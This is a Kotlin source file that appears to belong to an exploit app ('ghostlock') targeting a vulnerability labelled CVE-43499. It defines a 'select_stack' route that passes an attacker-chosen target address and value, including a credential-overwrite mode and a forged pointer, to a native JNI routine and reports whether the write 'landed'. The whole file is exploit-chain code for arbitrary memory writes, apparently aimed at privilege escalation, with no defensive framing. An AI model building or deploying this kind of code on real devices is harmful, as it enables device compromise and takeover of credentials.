package com.ghostlock.app.backend.cve43499.ktstep.run

import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.RouteResult
import com.ghostlock.app.engine.ktstep.WriteMode
import com.ghostlock.app.engine.ktstep.WriteRequest
import com.ghostlock.app.jni.cve43499.NativeSelectStackJni
import com.ghostlock.app.jni.cve43499.NativeSelectStackParams

/** select_stack production port; target/value come from the write request, layout from params. */
class Cve43499SelectStackPort(private val params: NativeSelectStackParams) : Cve43499RoutePort {
    override val route: Cve43499RouteId = Cve43499RouteId.SelectStack

    override fun attempt(request: WriteRequest, page: ByteArray, inputs: PayloadPageInputs, params: ByteArray): RouteResult {
        if (params.isNotEmpty()) return RouteResult.Refused("select-params-unexpected")
        val right = if (request.mode == WriteMode.Credential) {
            request.value
        } else if (request.preserveChild) {
            this.params.fakeRight
        } else {
            request.target - 8L
        }
        if (right == 0L) return RouteResult.Refused("select-fake-right-missing")
        val result = NativeSelectStackJni.run(
            this.params.copy(target = request.target, value = request.value, fakeRight = right),
        )
            ?: return RouteResult.Refused("select-jni-null")
        return if (result.ok) {
            RouteResult.Landed()
        } else {
            RouteResult.Refused("select:" + result.statusCode + ":" + result.statusStep)
        }
    }

    override fun close() = Unit
}
